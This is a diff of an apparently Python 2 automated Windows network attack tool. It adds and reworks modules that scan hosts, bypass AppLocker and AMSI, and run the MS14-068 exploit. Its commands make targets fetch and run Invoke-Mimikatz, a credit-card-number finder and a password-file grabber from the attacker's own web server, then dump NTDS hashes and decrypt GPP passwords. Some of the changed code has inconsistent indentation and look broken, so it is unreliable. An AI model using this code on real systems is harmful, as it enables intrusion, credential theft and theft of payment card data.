             newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash, command)
-	newCmd=newCmd.replace('-Command "','')
-	if debugMode==True:
-		print newCmd
+    newCmd=newCmd.replace('-Command "','')
+    if debugMode==True:
+        print newCmd
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
     else:
         command=powershellPath+" -ep bypass "+command
-	command=command.replace('-Command "','')
-	if debugMode==True:
-		print command
+    command=command.replace('-Command "','')
+    if debugMode==True:
+        print command
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
     if 'This program is blocked by group policy. For more information, contact your system administrator.' in results:
         print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+(setColor("[powershell]", color="green"))+" | Blocked By AppLocker"
@@ -3067,11 +3463,11 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
             #if obfuscatedMode==False:
             #command=' -Command "'+amsiBypassStr+';(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
             #command=powershellPath+' '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
-	    #command=powershellPath+' '+powershellArgs+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
-	    #command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
-	    command=' (New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\'        
-	    if debugMode==True:
-		print command
+            #command=powershellPath+' '+powershellArgs+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+            #command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+            command=' (New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\'        
+            if debugMode==True:
+            	print command
             #    command=' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder-obfs.ps1\',\'%temp%\credit-card-finder-obfs.ps1\');%temp%\credit-card-finder-obfs.ps1 -path '+driveNo+'\\\\"'        
             if applockerBypass==True:  
                 chosenNumber=2
@@ -3086,13 +3482,13 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
                     print newCmd
                 results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, newCmd) 
             else:
-		command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
+        	command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
                 results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
             #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
             if debugMode==True:
                 print command
                 print results
-	    print results
+        print results
             #tmpResultList=results[0].split("\n")
             #for x in tmpResultList:
             #    tmpResultList1.append(x)
@@ -3168,6 +3564,7 @@ def listRemoteShare(targetIP,domain, username, password):
 
 def getInstalledPrograms(targetIP,domain,username,password,passwordHash):
     osArch64=True
+    results=''
     powershellPath=getPowershellPath(targetIP,domain,username,password,passwordHash)
     powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
     command=" \"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
@@ -3192,6 +3589,30 @@ def getInstalledPrograms(targetIP,domain,username,password,passwordHash):
         if debugMode==True:   
             print command
             print results
+    if "Cannot find path" in str(results):
+        command=" \"Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
+        if applockerBypass==True:
+            newCmd=''
+            randomCount=(randint(1, 3))
+            if randomCount==1:
+                newCmd=appLockerBypass2(targetIP, domain, username, password, passwordHash,command)
+            if randomCount==2:
+                newCmd=appLockerBypass3(targetIP, domain, username, password, passwordHash,command)
+            if randomCount==3:
+                newCmd=appLockerBypass4(targetIP, domain, username, password, passwordHash,command)
+            if debugMode==True:                        
+                print newCmd
+            results,status=runWMIEXEC(targetIP,domain,username,password,passwordHash,newCmd)
+            if debugMode==True:   
+                print command
+                print results
+        else:
+            command=powershellPath+" "+powershellArgs+" -command \"Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName\""
+            results,status=runWMIEXEC(targetIP,domain,username,password,passwordHash,command)
+            if debugMode==True:   
+                print command
+                print results
+
     #results=runRemoteCMD(targetIP,domain,username,password,passwordHash,command)
     tmpResultList1=[]
     if "FullyQualifiedErrorId" not in str(results):
@@ -3376,7 +3797,7 @@ def getOSType():
     import platform
     return platform.system()
 
-def mountSysvol(username,password):
+def mountSysvol(domain,username,password):
     #Sample cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
     tmpPassList=[]
     status,foundAdmin=testDomainCredentials(username,password,None,dcList[0],'WORKGROUP',True)
@@ -3398,15 +3819,13 @@ def mountSysvol(username,password):
         resultList = runCommand(cmd, shell = True, timeout = 60) 
         if debugMode==True:
             print cmd
-            print resultList
         if len(resultList[1])<1:
-            print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[check sysvol] ", bold, color="green"))+"No credentials found"    
-            print "\n"
+            print "\n"+(setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Check sysvol] ", bold, color="green"))+"No credentials found"    
         if len(resultList[1])>0:
             fileList=resultList[1].split("\n")
             tmpPassList=[]
             if len(fileList)>0:
-                print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[sysvol] ", bold, color="green"))+"Found GPP Passwords"
+                print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Sysvol] ", bold, color="green"))+"Found GPP Passwords"
                 #print (setColor("[+]", bold, color="green"))+" Credentials found in SYSVOL folder"
                 for x in fileList:
                     x=x.strip()
@@ -3430,7 +3849,7 @@ def mountSysvol(username,password):
                                         tmpPassList.append([tmpusername,tmppassword])
             if len(tmpPassList)>0:
                 for x in tmpPassList:
-                    print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+username+":"+password+" | "+(setColor("[sysvol] ", bold, color="green"))+" Decrypted GPP Password: "+x[0]+":"+x[1] 
+                    print (setColor("[*]", bold, color="blue"))+" "+dcList[0]+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[sysvol] ", bold, color="green"))+" Decrypted GPP Password: "+x[0]+":"+x[1] 
                     #print (setColor("[+]", bold, color="green"))+" Decrypted GPP Password"            
                     #headers = ["Username","Password"]
                     #print tabulate(tmpPassList,headers,tablefmt="simple")
@@ -3461,7 +3880,7 @@ def mountSysvol(username,password):
                         if tmpLoginOK==True:
                                 print "User: '"+tmpusername+"' is not a 'Domain Admin'"          
                                 if len(nbList)>0:
-                                    if tmpip in nbList:              
+                                    if tmpip in nbList:       
                                         tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,tmpip,domain,False)
                                         if tmpAdminOK==False and tmpLoginOK==False:                        
                                             if len(nbList)>0 and len(tmpPassList)>0:
@@ -3559,9 +3978,9 @@ def findInterestingFiles(targetIP,domain,username,password,passwordHash):
     else:
         command=powershellCmdStart+" "+command
         results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
-	if debugMode==True:
-		print command
-		print results
+    if debugMode==True:
+        print command
+        print results
         tmpResultList=results.split("\n")
         for x in tmpResultList:
             x=x.strip()
@@ -4168,10 +4587,9 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     netbiosName=''
     try:
         netbiosName=n.queryIPForName(ip)[0]
-    except Exeception:
+    except Exception as e:
         pass
 
-    print (setColor("\nTesting MS14-068", color="green"))
     #print (setColor("\nTesting MS14-068", bold, color="red"))
     dateTime1=str(checkRemoteTime(ip))
     dateTime2=str(checkCurrentTime())
@@ -4185,9 +4603,9 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     dc_ip=ip
     address=netbiosName
     tmpFoundCreds=[]    
-    if domain.lower()==domainFull.lower() or domain.lower()==domainShort.lower():
-        print "adding: "+username+"\t"+password
-        tmpFoundCreds.append([username,password])
+    if domain.lower() in domainFull.lower() or domain.lower() in domainShort.lower():
+        if testDomainCredentials1(username,password,dc_ip)==True:
+            tmpFoundCreds.append([username,password])
     #print domainShort
     #for x in userPassList:
     #    if domainFull.lower() in str(x).lower():
@@ -4197,79 +4615,86 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     if len(tmpFoundCreds)>0:
         username=tmpFoundCreds[0][0]
         password=tmpFoundCreds[0][1]
-        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
-        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
-        try:
-            dumper.exploit()
-            tmpPasswordList=parseMimikatzOutput(dumper.getOutput())
-            if len(tmpPasswordList)>0:
-                print "\nTesting Credentials"
-                for y in tmpPasswordList:
-                    tmpdomain=y[0]
-                    tmpusername=y[1]
-                    tmppassword=y[2]
-                    tmppasswordHash=None
-                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],tmpdomain,False)
-                    if tmpAdminOK==True:
-                        if y not in daPassList:
-                            daPassList.append(y)
-                        tmpPassList.append(y)  
-        except Exception:
-            pass
-    dumper=None
-    if len(tmpFoundCreds)>0:
-        username=tmpFoundCreds[0][0]
-        password=tmpFoundCreds[0][1]
+    if testDomainCredentials1(username,password,target_ip)==True:
+            powershellPath=getPowershellPath(target_ip,domain,username,password,passwordHash)
+            command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
+            dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
+            try:
+                    dumper.exploit()
+                    tmpPasswordList=parseMimikatzOutput(dumper.getOutput())
+                    if len(tmpPasswordList)>0:
+                        print "\nTesting Credentials"
+                        for y in tmpPasswordList:
+                            	tmpdomain=y[0]
+                                tmpusername=y[1]
+                                tmppassword=y[2]
+                                tmppasswordHash=None
+                                tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],tmpdomain,False)
+                                if tmpAdminOK==True:
+                                    if y not in daPassList:
+                                        daPassList.append(y)
+                                tmpPassList.append(y)  
 
-        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\"+myIP+"\\guest'"
-        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
-        try:
-            dumper.exploit()
-        except Exception as e:
-            print e
-            pass
-        dumper=None
-        if not os.path.exists(origScriptPath+"/loot/system") or not os.path.exists(origScriptPath+"/loot/ntds"):
-            print (setColor("[-]", bold, color="red"))+" Unable to find NTDS.dll and SYSTEM hive"
-            os._exit(1)
-        else:            
-            print (setColor("[+]", bold, color="green"))+" Downloading NTDS.dll and SYSTEM hive"            
-            print (setColor("[+]", bold, color="green"))+" Converting NTDS.dll to NTLM hashes"            
-            cmd=pathEsedb+"/esedbexport -t /tmp/ "+origScriptPath+"/ntds"
-            resultList = runCommand(cmd, shell = True, timeout = 120)
-            time.sleep(2)
+                    dumper=None
+                    if len(tmpFoundCreds)>0:
+                        username=tmpFoundCreds[0][0]
+                        password=tmpFoundCreds[0][1]
 
-            outputFilename="/tmp/NT.out"
-            cmd="python "+pathNTDSExtract+"/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile "+outputFilename+" --pwdformat john --syshive "+origScriptPath+"/system"
-            resultList = runCommand(cmd, shell = True, timeout = 120)
+                        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\"+myIP+"\\guest'"
+                        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
+                        try:
+                            dumper.exploit()
+                        except Exception as e:
+                            #print e
+                            pass
+                        dumper=None
+                        if not os.path.exists(origScriptPath+"/loot/system") or not os.path.exists(origScriptPath+"/loot/ntds"):
+                            print (setColor("[-]", bold, color="red"))+" Unable to find NTDS.dll and SYSTEM hive"
+                            os._exit(1)
+                        else:            
+                            print (setColor("[+]", bold, color="green"))+" Downloading NTDS.dll and SYSTEM hive"            
+                            print (setColor("[+]", bold, color="green"))+" Converting NTDS.dll to NTLM hashes"            
+                            cmd=pathEsedb+"/esedbexport -t /tmp/ "+origScriptPath+"/ntds"
+                            resultList = runCommand(cmd, shell = True, timeout = 120)
+                            time.sleep(2)
 
-            if os.path.exists(outputFilename):
-                with open(outputFilename) as f:
-                    lines = f.read().splitlines()
-                    for x in lines:
-                        if x not in tmpHashList:
-                            tmpHashList.append(x)
-            if len(tmpHashList)>0:
-                if ip in uncompromisedHostList:
-                    uncompromisedHostList.remove(ip)
-                print (setColor("\n[+]", bold, color="green"))+" List of NTLM Hashes"            
-                for x in tmpHashList:
-                    tmpusername=x.split(":")[0]
-                    tmphash="aad3b435b51404eeaad3b435b51404ee:"+(x.split(":")[1]).split("$")[2]
-                    tmpuid=(x.split(":")[2]).split("-")[7]
-                    print tmpusername+":"+str(tmpuid)+":"+tmphash+":::"
-                    if [ip,domain,tmpusername,tmphash] not in userHashList:
-                        userHashList.append([ip,domain,tmpusername,tmphash])
-                    if tmpusername.lower()=="administrator":
-                        if len(domain)<1:
-                            domain="WORKGROUP"
-                        tmpHostList=[]
-                        for z in accessAdmHostList:
-                            tmpHostList.append(z[0])
-                        if ip not in tmpHostList:
-                            if [ip,domain,tmpusername,tmphash] not in accessAdmHostList:
-                                accessAdmHostList.append([ip,domain,tmpusername,tmphash])
+                            outputFilename="/tmp/NT.out"
+                            cmd="python "+pathNTDSExtract+"/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile "+outputFilename+" --pwdformat john --syshive "+origScriptPath+"/system"
+                            resultList = runCommand(cmd, shell = True, timeout = 120)
 
+                            if os.path.exists(outputFilename):
+                                with open(outputFilename) as f:
+                                    lines = f.read().splitlines()
+                                    for x in lines:
+                                        if x not in tmpHashList:
+                                            tmpHashList.append(x)
+                            if len(tmpHashList)>0:
+                                if ip in uncompromisedHostList:
+                                    uncompromisedHostList.remove(ip)
+                                print (setColor("\n[+]", bold, color="green"))+" List of NTLM Hashes"            
+                                for x in tmpHashList:
+                                    tmpusername=x.split(":")[0]
+                                    tmphash="aad3b435b51404eeaad3b435b51404ee:"+(x.split(":")[1]).split("$")[2]
+                                    tmpuid=(x.split(":")[2]).split("-")[7]
+                                    print tmpusername+":"+str(tmpuid)+":"+tmphash+":::"
+                                    if [ip,domain,tmpusername,tmphash] not in userHashList:
+                                        userHashList.append([ip,domain,tmpusername,tmphash])
+                                    if tmpusername.lower()=="administrator":
+                                        if len(domain)<1:
+                                            domain="WORKGROUP"
+                                        tmpHostList=[]
+                                        for z in accessAdmHostList:
+                                            tmpHostList.append(z[0])
+                                        if ip not in tmpHostList:
+                                            if [ip,domain,tmpusername,tmphash] not in accessAdmHostList:
+                                                accessAdmHostList.append([ip,domain,tmpusername,tmphash])
+
+
+
+            except Exception:
+            	    print (setColor("[-]", bold, color="red"))+" "+ip+":445 | "+domain+"\\"+username+":"+password+" | "+(setColor("[Testing MS14-068] ", bold, color="green"))+" | Not Vulnerable"    
+                    #print (setColor("[-]", bold, color="red"))+" DC "+ip+" not vulnerable to MS14-048"
+                    pass
 
             #accessAdmHostList.append()
     return tmpPassList,tmpHashList
@@ -4335,7 +4760,6 @@ def accessRemoteShare(targetIP,filePath,domain, username, password):
             conn.connect(targetIP, 445)  
             shareName=filePath.split("/")[0]
             subDirectory=filePath.replace(shareName,"")
-            conn.listPath(shareName, subDirectory)
             conn = None
             complete=True
             status=True
@@ -4369,6 +4793,7 @@ parser.add_argument("target", nargs='*', type=str, help="The target IP(s), range
 parser.add_argument("-d", type=str, dest="domain", help="Domain Name")
 parser.add_argument("-u", type=str, dest="username", help="Username")
 parser.add_argument("-p", type=str, dest="password", help="Password")
+#parser.add_argument("-C", type=str, dest="combinedList", help="File containing usernames/passwords (e.g. domain\\username||password)")
 parser.add_argument("-s", '--skip', action='store_true', help="Skip Lateral Movement/Privilege Escalation.  Only run POST exploitation modules")
 parser.add_argument('-L', '--list-modules', action='store_true', help='List available modules')
 parser.add_argument('-amsi', action='store_true', help='Enable AMSI Bypass')
@@ -4384,6 +4809,7 @@ if len(sys.argv) == 1:
 args = parser.parse_args()
 if args.list_modules:
     tmpResultList=[]
+    tmpResultList.append(['hashes','Dump NTLM hashes'])
     tmpResultList.append(['pan','Dump and search PAN numbers from disks and memory'])
     tmpResultList.append(['shares','Find the correct account credentials to access shares/folders'])
     tmpResultList.append(['files','Find interesting files (UltraVNC, Unattend.xml, KeePass Files, Web.config, Filezilla, *passwords* docs)'])
@@ -4399,233 +4825,339 @@ if args.list_modules:
     tmpResultList.append(['mssqlbrute','Bruteforce MSSQL \'sa\' Account'])
     tmpResultList.append(['mssqldata','Find Interesting Data in MSSQL Databases'])
     tmpResultList.append(['mssqlhash','Dump MSSQL Password Hashes'])
+    tmpResultList.append(['mssqlCmd','Bruteforce MSSQL \'sa\' Account and get a Command shell'])   
     tmpResultList.append(['pii','Find and dump PII data'])
     tmpResultList.append(['wdigest','Create the UseLogonCredentials key'])
     #tmpResultList.append(['rdp','Enable Remote Desktop (RDP) on hosts'])
     #tmpResultList.append(['apps','List installed applications on hosts'])
     print tabulate(tmpResultList)
     os._exit(0)
+try:
+    setupSMBShare()
+    if args.bypass:
+        applockerBypass=True
+    if len(args.target)<1:
+     print "[!] Please set a target"
+     sys.exit()
+    if args.amsi:
+        amsiMode=True
+    if args.obfs:
+        obfuscatedMode=True
+    if args.skip:
+        skipMode=True
+    if args.debug:
+        debugMode=True
+    if args.domain:
+        domain=args.domain
+    else:
+        domain='WORKGROUP'
+    if args.username:
+        username=args.username
+    if args.password:
+        password=args.password
+    #if not args.domain or not args.username or not args.password:
+    if not args.username or not args.password:
+        #if not args.combinedList:
+        print (setColor("[!]", bold, color="red"))+" Please provide the domain, username and password"
+        sys.exit()
 
-setupSMBShare()
-if args.bypass:
-    applockerBypass=True
-if len(args.target)<1:
- print "[!] Please set a target"
- sys.exit()
-if args.amsi:
-    amsiMode=True
-if args.obfs:
-    obfuscatedMode=True
-if args.skip:
-    skipMode=True
-if args.debug:
-    debugMode=True
-if args.domain:
-    domain=args.domain
-else:
-    domain='WORKGROUP'
-if args.username:
-    username=args.username
-if args.password:
-    password=args.password
-#if not args.domain or not args.username or not args.password:
-if not args.username or not args.password:
-    print (setColor("[!]", bold, color="red"))+" Please provide the domain, username and password"
-    sys.exit()
-
-if os.path.exists("secrets.ntds"):
-    os.remove("secrets.ntds")
-if os.path.exists("secrets.sam"):
-    os.remove("secrets.sam")
-
-inputStr=args.target[0]
-if "/" in inputStr:
-    for x in IPNetwork(inputStr):
-        if str(x) not in ipList:
-            if str(x) not in ipList: 
-                ipList.append(str(x))
-else:
-    if os.path.exists(inputStr):
-        with open(inputStr) as f:
+    combinedUserPassList=[]
+    '''
+    if args.combinedList:
+        with open(args.combinedList) as f:
             lines = f.read().splitlines()
             for x in lines:
-                if "/" in x:
-                    for y in IPNetwork(x):
-                        if str(y) not in ipList:
-                            if str(y) not in ipList:
-                                ipList.append(str(y))
-                else:
-                    if x not in ipList:
-                        ipList.append(x)
+                tmpusername=x.split("||")[0]
+                tmppassword=x.split("||")[1]
+                if [tmpusername,tmppassword] not in combinedUserPassList:
+                    combinedUserPassList.append([tmpusername,tmppassword])
     else:
+    '''
+    if args.username or args.password:
+        if [args.username,args.password] not in combinedUserPassList:
+            combinedUserPassList.append([args.username,args.password])
+
+    if os.path.exists("secrets.ntds"):
+        os.remove("secrets.ntds")
+    if os.path.exists("secrets.sam"):
+        os.remove("secrets.sam")
+
+    inputStr=args.target[0]
+    if "/" in inputStr:
         ipList.append(inputStr)
+        '''
+        for x in IPNetwork(inputStr):
+            if str(x) not in ipList:
+                if str(x) not in ipList: 
+                    ipList.append(str(x))
+        '''
+    else:
+        if os.path.exists(inputStr):
+            with open(inputStr) as f:
+                lines = f.read().splitlines()
+                for x in lines:
+                    ipList.append(x)
+                '''
+                for x in lines:
+                    if "/" in x:
+                        for y in IPNetwork(x):
+                            if str(y) not in ipList:
+                                if str(y) not in ipList:
+                                    ipList.append(str(y))
+                    else:
+                        if x not in ipList:
+                            ipList.append(x)
+                '''
+        else:
+            ipList.append(inputStr)
 
-cmd="rm -rf /tmp/.export"
-runCommand(cmd, shell = True, timeout = 30)
-cmd="rm -rf /tmp/ntds.export"
-runCommand(cmd, shell = True, timeout = 30)
-cmd="rm "+os.getcwd()+"/system"
-runCommand(cmd, shell = True, timeout = 30)
-cmd="rm "+os.getcwd()+"/NTDS"
-runCommand(cmd, shell = True, timeout = 30)
+    cmd="rm -rf /tmp/.export"
+    runCommand(cmd, shell = True, timeout = 30)
+    cmd="rm -rf /tmp/ntds.export"
+    runCommand(cmd, shell = True, timeout = 30)
+    cmd="rm "+os.getcwd()+"/system"
+    runCommand(cmd, shell = True, timeout = 30)
+    cmd="rm "+os.getcwd()+"/NTDS"
+    runCommand(cmd, shell = True, timeout = 30)
 
-passwordHash=None
+    passwordHash=None
 
-portList=[]
-portList.append("389")
-portList.append("445")
-portList.append("1433")
-portList.append("3389")
+    portList=[]
+    portList.append("389")
+    portList.append("445")
+    portList.append("1433")
+    portList.append("3389")
+    liveList=[]
 
-ipListStr=", ".join(ipList)
-print (setColor("[*]", bold, color="green"))+" Scanning Target Network"
-myIP=get_ip_address()
+    ipListStr=", ".join(ipList)
+    print (setColor("[*]", bold, color="green"))+" Scanning Target Network"
+    myIP=get_ip_address()
 
-web_dir = os.getcwd()+"/modules"
-os.chdir(web_dir)
-threading.Thread(target=my_tcp_server).start()
+    modulesDir = os.getcwd()+"/modules"
+    os.chdir(modulesDir)
+    threading.Thread(target=my_tcp_server).start()
 
-#updateMimiStaging()
-
-import resource
-resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
-screenLock = threading.Semaphore(value=3)
-for port in portList:
-    for x in ipList:
-        scanThread(x, port)
-for x in liveList:
-    hostNo=x[0]
-    portNo=x[1]
-    if portNo=='1433':
-        if hostNo!=myIP:
-	    hostNo=hostNo.strip()
-            mssqlList.append(hostNo)
-    if portNo=='3389':
-	hostNo=hostNo.strip()
-        rdpList.append(hostNo)
-    if portNo=='445':
-        if hostNo not in dcList:
+    #updateMimiStaging()
+    '''
+    import resource
+    resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
+    screenLock = threading.Semaphore(value=3)
+    for port in portList:
+        for x in ipList:
+            scanThread(x, port)
+    '''
+    nm = nmap.PortScanner()
+    for z in portList:
+        for x in ipList:
+            nm.scan(x,str(z),arguments='-Pn -T4 -sT -n --open --max-rtt-timeout=950ms --max-retries=3 --min-hostgroup=51 --min-parallelism=70 --max-parallelism=150')
+            tmpHostList=nm.all_hosts()
+            for y in tmpHostList:
+                y=y.strip()
+                if y not in liveList:
+                    liveList.append([y,z])
+    for x in liveList:
+        hostNo=x[0]
+        portNo=x[1]
+        if portNo=='1433':
             if hostNo!=myIP:
-		hostNo=hostNo.strip()
-                nbList.append(hostNo)
-    if portNo=='389':
-	hostNo=hostNo.strip()
-        dcList.append(hostNo)
-        if hostNo in nbList:
-            nbList.remove(hostNo)
-if len(dcList)<1 and len(rdpList)<1 and len(nbList)<1:
-    print "[+] No Domain Controllers/NetBIOS/RDP ports detected on target hosts"
-    os._exit(0)
-else:
-    for x in dcList:
-        print x+" [DC]"
-        if x not in uncompromisedHostList:
-            uncompromisedHostList.append(x)
-    for x in nbList:
-        print x+" [NBNS]"
-        if x not in uncompromisedHostList:
-            uncompromisedHostList.append(x)
-    for x in rdpList:
-        print x+" [RDP]"        
-    for x in mssqlList:
-        print x+" [MSSQL]"        
+                hostNo=hostNo.strip()
+                mssqlList.append(hostNo)
+        if portNo=='3389':
+            hostNo=hostNo.strip()
+            rdpList.append(hostNo)
+        if portNo=='445':
+            if hostNo not in dcList:
+                if hostNo!=myIP:
+                    hostNo=hostNo.strip()
+                    nbList.append(hostNo)
+        if portNo=='389':
+            hostNo=hostNo.strip()
+            dcList.append(hostNo)
+            if hostNo in nbList:
+                nbList.remove(hostNo)
+
+    if len(dcList)<1 and len(rdpList)<1 and len(nbList)<1:
+        print "[+] No Domain Controllers/NetBIOS/RDP ports detected on target hosts"
+        os._exit(0)
+    else:
+        leftOverRDPList=[]
+        tmpOutputList=[]
+        for x in dcList:
+            print x+" [DC]"
+            if x not in uncompromisedHostList:
+                uncompromisedHostList.append(x)
+        for x in nbList:
+            #if x in rdpList:
+            #    print x+" [NBNS][RDP]"
+            #else:
+            #    leftOverRDPList.append(x)
+            #    print x+" [NBNS]"
+            if x not in uncompromisedHostList:
+                uncompromisedHostList.append(x)
+        #for x in leftOverRDPList:
+        #    print x+" [RDP]"        
+        #for x in mssqlList:
+        #    print x+" [MSSQL]"   
+        for x in nbList:
+            tmpHost=x+" "
+            if x in dcList:
+                tmpHost+="[DC]"
+            if x in nbList:
+                tmpHost+="[NBNS]"
+            if x in rdpList:
+                tmpHost+="[RDP]"
+            if x in mssqlList:
+                tmpHost+="[MSSQL]"
+            print tmpHost
+        for x in rdpList:
+            tmpHost=x+" "
+            if x not in nbList:
+                tmpHost+="[RDP]"
+                if x in dcList:
+                    tmpHost+="[DC]"                
+                if x in mssqlList:
+                    tmpHost+="[MSSQL]"
+                print tmpHost
     print "\n"
 
-isDomainAccount=False
-logging.getLogger().setLevel(logging.ERROR)
-logging.disabled = False
-passwordHash=None
+    isDomainAccount=False
+    logging.getLogger().setLevel(logging.ERROR)
+    logging.disabled = False
+    passwordHash=None
 
-cleanUp()
-for x in nbList:
-    #testAccount
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
-    if testAccount(x, domain, username, password, passwordHash)==True:
-        if [x, domain, username, password] not in accessAdmHostList:
-            accessAdmHostList.append([x, domain, username, password])                            
-for x in dcList:
-    if testAccount(x, domain, username, password, passwordHash)==True:
-        if [x, domain, username, password] not in accessAdmHostList:
-            accessAdmHostList.append([x, domain, username, password])                                    
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
-    #    if [x, domain, username, password] not in accessAdmHostList:
-    #        accessAdmHostList.append([x, domain, username, password])                            
-#print "\n"
+    cleanUp()
+    for x in nbList:
+        for y in combinedUserPassList:
+            domain="WORKGROUP"
+            passwordHash=None
+            username=y[0]        
+            if "\\" in username:
+                domain=username.split("\\")[0]
+                username=username.split("\\")[2]
+            password=y[1]
+            if testAccount(x, domain, username, password, passwordHash)==True:
+                if [x, domain, username, password] not in accessAdmHostList:
+                    accessAdmHostList.append([x, domain, username, password])                            
+    for x in dcList:
+        for y in combinedUserPassList:
+            domain="WORKGROUP"
+            passwordHash=None
+            username=y[0]        
+            if "\\" in username:
+                domain=username.split("\\")[0]
+                username=username.split("\\")[2]
+            password=y[1]
+            if testAccount(x, domain, username, password, passwordHash)==True:
+                if [x, domain, username, password] not in accessAdmHostList:
+                    accessAdmHostList.append([x, domain, username, password])                            
 
-if skipMode==False:
-    if len(dcList)>0:    
-        isDA=getDomainAdminUsers(username,password,dcList[0])
-    if domain.lower()=="workgroup":
-        if len(dcList)>0:
-            ip=dcList[0]
-            #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
-            mountSysvol(username,password)
+    if skipMode==False:
+        if len(dcList)>0:    
+            isDA=getDomainAdminUsers(username,password,dcList[0])
+        if domain.lower()=="workgroup":
+            if len(dcList)>0:
+                ip=dcList[0]
+                #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
+                mountSysvol(domain,username,password)
 
-        tmpHostList=[]
-        for y in accessAdmHostList:
-            tmpHostList.append(y[0])
